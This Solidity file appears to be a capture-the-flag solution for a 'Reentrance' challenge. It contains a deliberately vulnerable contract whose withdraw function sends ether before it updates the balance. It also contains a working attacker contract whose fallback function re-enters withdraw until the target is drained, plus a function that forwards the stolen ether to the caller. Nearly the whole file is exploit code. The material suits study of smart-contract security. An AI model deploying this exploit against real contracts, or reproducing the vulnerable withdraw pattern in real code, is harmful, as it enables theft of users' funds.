// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    // using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        // balances[_to] = balances[_to].add(msg.value);
        balances[_to] += msg.value;
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract iAmGonnaGiveYouMoneySeriously {
    Reentrance vulnerableContract;

    constructor(address payable _vulnerableContract) {
        vulnerableContract = Reentrance(_vulnerableContract);
    }

    // you can use receive() or fallback()
    // order of calling
    // 1. receive
    // 2. fallback

    // receive() external payable {}

    fallback() external payable {
        if (address(vulnerableContract).balance >= 0.001 ether) {
            vulnerableContract.withdraw(0.001 ether);
        }
    }

    function initiateAttack(address _address) external payable {
        require(msg.value == 0.001 ether);
        vulnerableContract.donate{value: 0.001 ether}(_address);
        vulnerableContract.withdraw(0.001 ether);
    }

    function retrieveEther() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
